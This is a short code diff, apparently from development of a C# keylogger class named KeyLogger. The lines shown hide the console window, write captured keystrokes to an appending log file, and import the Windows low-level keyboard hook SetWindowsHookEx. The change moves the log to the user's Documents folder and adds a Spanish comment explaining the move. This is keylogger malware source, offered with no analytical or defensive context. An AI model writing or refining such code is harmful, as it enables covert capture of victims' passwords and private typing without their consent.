@@ -23,9 +23,9 @@ class KeyLogger
         IntPtr handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
 
-        string exePath = Assembly.GetExecutingAssembly().Location;
-        string exeDir = Path.GetDirectoryName(exePath);
-        string logPath = Path.Combine(exeDir, "log.txt");
+        // Guardar el log en la carpeta Documentos del usuario
+        string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        string logPath = Path.Combine(documentsPath, "log.txt");
 
         logWriter = new StreamWriter(new FileStream(logPath, FileMode.Append, FileAccess.Write))
         {
@@ -134,6 +134,7 @@ class KeyLogger
         }
     }
 
+    // DLL Imports
     [DllImport("user32.dll")]
     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
         IntPtr hMod, uint dwThreadId);
